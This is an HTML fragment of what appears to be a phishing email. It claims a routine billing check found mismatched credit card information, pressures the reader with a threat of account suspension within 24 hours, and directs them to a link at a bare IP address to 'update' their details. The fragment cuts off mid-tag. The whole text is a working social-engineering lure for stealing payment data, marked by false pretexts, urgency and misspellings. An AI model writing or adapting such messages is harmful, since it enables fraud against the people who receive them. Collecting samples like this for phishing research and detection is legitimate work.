	      <font face="Arial" size="2px">While performing it's regular scheduled monthly billing address check our system found incompatible 
information which seams to be no longer the same with your current credit card information that we have on file. If you changed your billing 
information or if you moved from you previous address please follow up the link bellow and update your billing information: If you didn't change any of 
this information you still need to follow up the previous link and update your existing billing information because it means that our database regular 
scheduled update wasn't made correctly. Choosing to ignore this message will result in to a temporary suspension of your account within 24 hours, until 
you will choose to solve this unpleasant situation.<br>
	<br>
	We apologies for any inconvinience this may caused you and we strongly advise you to update your information 
you have on file with us. Please <a  href="http://81.255.3.60/cuna/"
